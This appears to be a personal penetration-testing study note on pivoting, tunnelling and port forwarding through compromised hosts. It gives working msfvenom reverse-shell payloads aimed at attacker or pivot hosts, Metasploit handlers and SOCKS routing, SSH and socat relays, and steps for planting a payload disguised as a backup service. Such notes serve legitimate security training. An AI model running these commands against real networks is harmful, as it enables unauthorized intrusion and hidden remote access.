```table-of-contents
title: ## Table of Contents
style: nestedList # TOC style (nestedList|nestedOrderedList|inlineFirstLevel)
minLevel: 0 # Include headings from the specified level
maxLevel: 3 # Include headings up to the specified level
includeLinks: true # Make headings clickable
debugInConsole: false # Print debug info in Obsidian console
```
A very common situation is when we have compromised a reachable host from our attack machine but aren't able to access any other targets from our machine. This is where a *pivot host* is useful for further accessing machines connected to our compromised one that we can't reach directly from our attack host.

## Pivoting
Pivoting is *moving to other networks through a compromised host to find more targets on different network segments*. The goal of pivoting is to defeat segmentation (both physically and virtually) to access an isolated network.
> Pivoting is slightly different to Lateral Movement as it works to move to other networks whereas Lateral Movement is movement within the same network.

On any new compromised host we should always check:
- Our privilege level
- Any network connections (`ifconfig` / `ipconfig`)
- Potential VPN or remote access software

If a host has more than one network adapter, we can likely use it to move to another network segment.
> Some common names a pivot host might also be called:
> - Proxy
> - Foothold
> - Beach Head System
> - Jump Host
### The Networking Behind Pivoting
Computers can have multiple (physical or virtual) NICs or Network Adapters, each with their own IP address. These can all be viewed with `ifconfig` / `ipconfig`. From here we can view the names (*`tun` is often an indicator of a VPN*) and IP addresses (*Look for public addresses*). 

Any system can participate in routing, not just a router. We can view the routing table using either (*this can show us valuable information about what networks the machine can access*):
```bash
$ netstat -r

$ ip route
```

### Preparing a Pivot
If we have a compromised host that has access to other networks, we can scan that network for other hosts using the IP range ([[Network Addressing#Subnetting]]).
Like [[#SSH port forwarding to access closed ports]], we can utilise SSH for this dynamic port forwarding and pivoting. However, we also need to utilise a *SOCKS Listener* on our local machine then configure SSH to forward traffic to the network after connecting to the target host (*This is SSH tunneling over SOCKS proxy*).

#### SOCKS
Socket Secure (*SOCKS*) is a protocol for communicating with servers when firewall restrictions are present. Most protocols initiate a connection to connect to a service, SOCKS instead generates traffic from a client, which then connects to the SOCKS server controlled by the user who wants to access a service on the client-side. This is very useful for circumventing restrictions from firewalls, allowing external entities to bypass the firewall and access protected services. SOCKS proxy can create a route to an external server from NAT networks.

*SOCKS4* doesn't support UDP or authentication, *SOCKS5* does.
> [[#SSH dynamic port forwarding with SOCKS]]

## Tunnelling
Tunnelling is when we *encapsulate traffic in another protocol and route traffic through it*. VPNs are an example of tunnelling. This is particularly useful for evading detection systems where we need to discretely pass traffic in/out of a network (eg. using HTTPS to mask our C2 traffic). 
### Tunnelling with Meterpreter
1. We need to first create a payload for the pivot host (*this example creates a reverse tcp meterpreter shell which will connect back to port 8080 on our machine*)
```bash
$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<attack_host_IP> -f elf -o backup LPORT=8080
```
2. Next we need to setup a *Generic Payload Handler* (`multi/handler`)
```bash
msf6 > use exploit/multi/handler
> set payload linux/x64/meterpreter/reverse_tcp
> set lhost 0.0.0.0
> set lport 8080
> run

[*] Started reverse TCP handler on 0.0.0.0:8080
```
3. We can then copy the payload over to the pivot host and execute it, this will form the meterpreter reverse connection back to our handler
4. From here we can use modules like `post/multi/gather/ping_sweep` or bash to search for targets on the internal networks etc (*remember windows blocks ICMP requests normally*)
```bash
for i in {1..254} ;do (ping -c 1 x.x.x.$i | grep "bytes from" &) ;done
```
```batch
for /L %i in (1 1 254) do ping x.x.x.%i -n 1 -w 100 | find "Reply"
```
```PowerShell
1..254 | % {"x.x.x.$($_): $(Test-Connection -count 1 -comp x.x.x.$($_) -quiet)"}
```
> It is often worth performing these checks at least twice as sometimes the system will need time to build its arp cache. This could mean that some systems may not result in a successful reply on the first attempt.

If a host's firewall blocks ICMP requests (pings) then we will have to use nmap's TCP scan instead.
### Socks proxy with Metasploit
1. We can use the `socks_proxy` module in [[Metasploit]] to configure a local SOCKS proxy on our attack machine.
```bash
msf6 > use auxiliary/server/socks_proxy

# makes the proxy listen on 0.0.0.0:9050
> set SRVPORT 9050
> set SRVHOST 0.0.0.0
# Use SOCKS version 4a
> set version 4a
> run

# Confirm proxy server is running
> jobs
```
2. We can then configure [[Proxychains]] to do the routing for our tools
![[Proxychains#Configuration]]
3. We need to make the `socks_proxy` route all the traffic via our existing [[#Tunnelling with Meterpreter|Meterpreter session]] with `autoroute`
```bash
msf6 > use post/multi/manage/autoroute

> set SESSION 1
> set SUBNET <our_target_internal_subnet>
> run
```
> this is possible to do directly in the meterpreter session with `run autoroute -s <subnet>` but it is deprecated.
> We can see all the routes in the meterpreter session with `run autoroute -p` or setting the `CMD` option to `print` in the `autoroute` module

4. Finally, we can run our tool (`nmap`) through [[Proxychains]] which will route through our [[#Tunnelling with Meterpreter|Meterpreter session]].
```bash
$ proxychains nmap -sn -v <target_internal_subnet>
```
![[meterpreter-socks-proxy.drawio.png]]

## Port Forwarding
Port forwarding is *redirecting a communication request from one port to another*. TCP is used as the primary communication layer but application layer protocols like SSH or even [SOCKS](https://en.wikipedia.org/wiki/SOCKS) (non-application layer) can be used to encapsulate the forwarded traffic. Port forwarding can be a useful technique for bypassing firewalls and using existing services on the compromised host to pivot to other networks.

### SSH port forwarding to access closed ports
![[port-forwarding.drawio.png]]
1. First we check to see what ports are open on our target system using [[Nmap]]
```bash
$ nmap -sT -p- x.x.x.x

PORT     STATE  SERVICE
22/tcp   open   ssh
3306/tcp closed mysql
```
We can access SSH but MySQL is closed (*as it is for local use only*) so to get access to it we need to do some port forwarding.

2. We can use SSH to expose a port (`1234`) on our local machine and route all traffic from remote `3306` to it (*`-L` can be used multiple times to forward multiple remote ports*)
```bash
$ ssh -L 1234:localhost:3306 user@x.x.x.x
```
> This command:
> 1. Exposes port `1234` on our attack machine
> 2. Port forwards the remote's `localhost:3306` to the attack machine's port `1234`
> 3. Finally, establishes the ssh connection to the remote server

3. We can then use `netstat` or [[Nmap]] to confirm the port has been forwarded
```bash
$ netstat -antp | grep 1234

tcp        0      0 127.0.0.1:1234          0.0.0.0:*               LISTEN      4034/ssh
tcp6       0      0 ::1:1234                :::*                    LISTEN      4034/ssh
```
```bash
$ nmap -v -sV -p1234 localhost

PORT     STATE SERVICE VERSION
1234/tcp open  mysql   MySQL 8.0.28-0ubuntu0.20.04.3
```

### SSH dynamic port forwarding with SOCKS
![[dynamic-port-forwarding-with-socks.webp]]
1. First we request the communication with the SSH server from our client, we ask for dynamic port forwarding to be established and specify our client to listen on `localhost:9050`.
```bash
$ ssh -D 9050 user@x.x.x.x
```
2. Next we use a tool like [[Proxychains]] to redirect the TCP connections through SOCKS.
![[Proxychains#Configuration]]
3. Redirect [[Nmap]]'s packets to run through our proxy chain (*this is called SOCKS tunneling*)
![[Proxychains#Redirecting a tool's packets with proxychains]]

### SSH Pivoting with Sshuttle


### Remote/Reverse port forwarding with SSH
Lets say we are able to connect to a pivot host and then connect to another system. If we wanted to *get a reverse shell* we would have to forward the traffic all the way back through our chain and to our attack machine. We would do this by having the reverse shell point to our nearest pivot host to the target, then from there we would forward all the traffic back through our chain from the pivot host.
![[pivot-reverse-shell.drawio.png]]
1. Create the payload / reverse shell application with the connection details for the pivot host
```bash
$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<internal_IP_of_pivot_host> LPORT=8080 -f exe -o backupservice.exe
```
2. Setup a `multi/handler` listening on our machine for the traffic
```bash
msf6 > use exploit/multi/handler
> set payload windows/x64/meterpreter/reverse_https
> set lhost 0.0.0.0
> set lport 8000
> run

[*] Started HTTPS reverse handler on https://0.0.0.0:8000
```
3. [[Misc/File Transfer|Transfer]] the payload over to the pivot host
```bash
$ scp backupservice.exe user@<IP_of_pivot_host>:~/
```
4. [[Misc/File Transfer|Transfer]] the file from the pivot host to the target
```bash
user@pivot_host$ python3 -m http.server 8123
```
```PowerShell
PS C:\Windows\System32> Invoke-WebRequest -Uri "http://<internal_IP_of_pivot_host>:8123/backupservice.exe" -OutFile "C:\backupservice.exe"
```
5. Next we will use the *SSH remote port forwarding* feature to forward the traffic on the ubuntu server to our attack machine
```bash
$ ssh -R <internal_IP_of_pivot_host>:8080:0.0.0.0:8000 user@pivot_host -vN
```
> `-R` sets up the remote port forwarding, where the first IP & port is where the machine will receive traffic from eg. (its internal_ip & port) then where to forward the traffic too eg. (our IP  or 0.0.0.0, and port).
> `-v` is verbose
> `-N` asks not to prompt the login shell
6. Execute the payload and we should get the reverse shell through our listener
> Our connection will list that it is coming from the local host itself (127.0.0.1) as it is coming from the *local SSH socket*, but the traffic is really coming form an outbound connection we established to the pivot host.

In the logs on the pivot host we will be able to see the forwarding:
```
debug1: client_request_forwarded_tcpip: listen 172.16.5.129 port 8080, originator 172.16.5.19 port 61356
debug1: connect_next: host 0.0.0.0 ([0.0.0.0]:8000) in progress, fd=4
debug1: channel 0: new [172.16.5.19]
debug1: confirm forwarded-tcpip
debug1: channel 0: connected to 0.0.0.0 port 8000
```
![[pivot-reverse-shell-2.webp]]

### Port forwarding using Meterpreter
The `portfwd` module in [[Meterpreter]] can be used to forward traffic from our attack machine on received a particular port onwards to a remote host on another network.
```bash
meterpreter > help portfwd

Usage: portfwd [-h] [add | delete | list | flush] [args]

OPTIONS:

    -h        Help banner.
    -i <opt>  Index of the port forward entry to interact with (see the "list" command).
    -l <opt>  Forward: local port to listen on. Reverse: local port to connect to.
    -L <opt>  Forward: local host to listen on (optional). Reverse: local host to connect to.
    -p <opt>  Forward: remote port to connect to. Reverse: remote port to listen on.
    -r <opt>  Forward: remote host to connect to.
    -R        Indicates a reverse port forward.
```
```bash
# This command creates a listener on the attack host's local port (-l) 3300
# It then forwards all packets to the remote (-r) server x.x.x.x on port 3389 (-p) via our session
meterpreter > portfwd add -l 3300 -p 3389 -r x.x.x.x

[*] Local TCP relay crated: :3300 <-> x.x.x.x:3389
```

We could then direct the traffic from a tool like `xfreerdp` to use the attack machine's local port and be forwarded to the remote server
```bash
$ xfreerdp /v:localhost:3300 /u:<user> /p:<pass>
```

### Reverse port forwarding with Meterpreter
This is used for forwarding a reverse connection from a target to our attack machine via a pivot host.
1. Configure the reverse port forward on the pivot host's meterpreter session using `portfwd`
```bash
# This command specifies a reverse (-R) connection
# forwarding any receieved traffic on the pivot host's port (-p) 1234
# to our attack machine (-L) on port (-l) 8081
meterpreter > portfwd add -R -p 1234 -l 8081 -L <attack_machine_ip>
```
2. We can then setup the `multi/handler` listener on our attack machine to wait for the connection
```bash
meterpreter > bg
[*] Backgrounding session 1...

msf6 > use exploit/multi/handler
> set payload windows/x64/meterpreter/reverse_tcp
> set LHOST 0.0.0.0
> set LPORT 8081
> run

[*] Started reverse TCP handler on 0.0.0.0:8081
```
3. We then create the reverse shell payload for the target system, that will connect to our pivot host on port `1234`
4. Once we transfer and execute the payload on the target system, we should see the reverse connection get forwarded all the way back to our attack machine's listener

### Using [[Socat]] redirection for Reverse Shells
1. Generate our payload (*that will connect to our pivot host*) and start a listener (*on our attack machine, waiting for the payload connection*) (eg. [[MSFVenom]] & [[Metasploit]] - `multi/handler`).
2. Use [[Socat]] to start a listener on the pivot host, redirecting traffic it receives from our payload to our attack host.
```sh
$ socat TCP4-LISTEN:<payload_traffic_port>, fork TPC4:<attack_host>:<port>
```
3. Transfer the payload to the target system and execute, catch the reverse shell with the listener

### Using [[Socat]] redirection for Bind Shells
1. Generate the bind shell payload (*specify the port to receive the connection on*) - [[MSFVenom]]
2. Start the [[Socat]] bind shell listener on the pivot host
```sh
$ socat TCP4-LISTEN:<pivot_host_port>, fork TCP4:<target_host>:<port_of_bind_shell>
```
3. Start the bind shell listener on the attack machine that targets the pivot host's IP & port - [[Metasploit]] : `multi/handler`

### Port forwarding from a Windows machine
[Plink](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html)(*PuTTY link*) is a Windows SSH CLI tool that comes as standard with the PuTTY package. It is sometimes present on windows systems and useful if we are trying to '*live-of-the-land*'. We might be in a situation where we **need to use SSH on a windows system for pivoting** or we could even be using a windows-based attack host, Plink could be the way to do this.
![[plink.webp]]
To start the dynamic port forward with plink.exe we can use:
```batch
plink -ssh -D <local_port> <user>@<pivot_host>
```

We can then use [Proxifier](https://www.proxifier.com/) to create a SOCKS tunnel over the SSH session. It allows you to create a SOCKS or HTTPS proxy (and proxy chains) for desktop client applications. [Proxifier](https://www.proxifier.com/) is a GUI application, within it we can create a SOCKS server for `127.0.0.1` on the port we used for SSH.

We can then start `mstsc.exe` with our windows target IP to proxy the RDP connection.